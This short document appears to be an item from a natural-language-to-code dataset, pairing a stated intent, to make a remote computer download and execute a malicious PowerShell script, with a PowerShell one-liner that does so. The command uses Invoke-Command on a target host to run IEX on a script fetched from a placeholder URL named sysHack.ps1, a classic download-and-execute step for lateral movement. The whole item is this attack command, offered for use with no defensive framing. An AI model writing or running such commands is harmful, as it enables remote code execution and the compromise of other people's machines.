# Natural language intent:
# Invoke a command on a remote computer to download and execute a malicious PowerShell script from a specific URL.

Invoke-Command -ComputerName $target -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')}
